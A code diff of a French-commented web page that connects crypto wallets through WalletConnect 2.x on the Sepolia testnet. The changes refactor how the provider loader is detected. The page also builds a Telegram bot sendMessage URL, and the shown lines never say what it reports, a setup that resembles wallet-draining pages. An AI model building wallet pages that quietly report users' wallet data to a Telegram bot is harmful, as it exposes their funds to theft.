@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Charger WalletConnect 2.x (version 2.19.1) -->
+    <!-- Charger WalletConnect 2.x (version 2.19.1 pour l'instant) -->
     <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.19.1/dist/index.umd.js" defer></script>
     <style>
         /* Styles pour le popup et l'overlay */
@@ -222,22 +222,51 @@
         // URL Telegram
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-        // Fonction pour attendre que window.WalletConnectEthereumProvider soit défini
+        // Fonction pour attendre que WalletConnect soit chargé
         async function waitForWalletConnectProvider(maxAttempts = 10, interval = 500) {
             let attempts = 0;
-            while (!window.WalletConnectEthereumProvider && attempts < maxAttempts) {
-                console.log(`Tentative de chargement de WalletConnectEthereumProvider, tentative #${attempts}`);
+            let walletConnectProvider = null;
+
+            while (!walletConnectProvider && attempts < maxAttempts) {
+                console.log(`Tentative de chargement de WalletConnect, tentative #${attempts}`);
                 // Log pour déboguer les objets globaux définis
                 console.log('Objets globaux potentiels :', Object.keys(window).filter(key => key.toLowerCase().includes('walletconnect')));
+
+                // Vérifier window.WalletConnectEthereumProvider
+                if (window.WalletConnectEthereumProvider) {
+                    walletConnectProvider = window.WalletConnectEthereumProvider;
+                    console.log('window.WalletConnectEthereumProvider trouvé :', walletConnectProvider);
+                    break;
+                }
+
+                // Vérifier window['@walletconnect/ethereum-provider']
+                if (window['@walletconnect/ethereum-provider']) {
+                    console.log('window["@walletconnect/ethereum-provider"] trouvé :', window['@walletconnect/ethereum-provider']);
+                    // Vérifier si cet objet contient une propriété ou une méthode utilisable
+                    const wcObject = window['@walletconnect/ethereum-provider'];
+                    if (typeof wcObject.init === 'function') {
+                        walletConnectProvider = wcObject;
+                        console.log('Utilisation de window["@walletconnect/ethereum-provider"] comme provider.');
+                        break;
+                    } else if (wcObject.WalletConnectEthereumProvider) {
+                        walletConnectProvider = wcObject.WalletConnectEthereumProvider;
+                        console.log('window["@walletconnect/ethereum-provider"].WalletConnectEthereumProvider trouvé :', walletConnectProvider);
+                        break;
+                    }
+                }
+
                 await delay(interval);
                 attempts++;
             }
-            if (!window.WalletConnectEthereumProvider) {
-                console.log('Échec du chargement de WalletConnectEthereumProvider après plusieurs tentatives.');
+
+            if (!walletConnectProvider) {
+                console.log('Échec du chargement de WalletConnect après plusieurs tentatives.');
                 console.log('État final de window.WalletConnectEthereumProvider :', window.WalletConnectEthereumProvider);
-                throw new Error('WalletConnectEthereumProvider n’est pas chargé après plusieurs tentatives.');
+                console.log('État final de window["@walletconnect/ethereum-provider"] :', window['@walletconnect/ethereum-provider']);
+                throw new Error('WalletConnect n’est pas chargé après plusieurs tentatives.');
             }
-            console.log('WalletConnectEthereumProvider chargé avec succès :', window.WalletConnectEthereumProvider);
+
+            return walletConnectProvider;
         }
 
         // Initialisation au chargement de la page
@@ -274,11 +303,12 @@
                     return;
                 }
 
-                // Attendre que WalletConnect EthereumProvider soit chargé
+                // Attendre que WalletConnect soit chargé
+                let walletConnectProvider;
                 try {
-                    await waitForWalletConnectProvider();
+                    walletConnectProvider = await waitForWalletConnectProvider();
                 } catch (error) {
-                    console.error('Erreur : WalletConnect EthereumProvider (WalletConnect 2.x) n’est pas chargé.', error);
+                    console.error('Erreur : WalletConnect (WalletConnect 2.x) n’est pas chargé.', error);
                     updateStatus(elements, 'Erreur : Problème de chargement de WalletConnect.', false, 'red');
                     return;
                 }
@@ -290,7 +320,7 @@
 
                     try {
                         // Afficher la liste des wallets
-                        await showWalletList(elements);
+                        await showWalletList(elements, walletConnectProvider);
                     } catch (error) {
                         updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
                         console.error('Erreur capturée :', error);
@@ -316,7 +346,7 @@
         });
 
         // Fonction pour afficher la liste des wallets
-        async function showWalletList(elements) {
+        async function showWalletList(elements, walletConnectProvider) {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
 
@@ -356,7 +386,7 @@
                     try {
                         // Initialiser WalletConnect 2.x
                         console.log('Initialisation de WalletConnect 2.x...');
-                        const provider = await window.WalletConnectEthereumProvider.init({
+                        const provider = await walletConnectProvider.init({
                             projectId: CONFIG.WALLET_CONNECT_PROJECT_ID, // Ton projectId
                             chains: [11155111], // Sepolia
                             optionalChains: [], // Pas de chaînes optionnelles
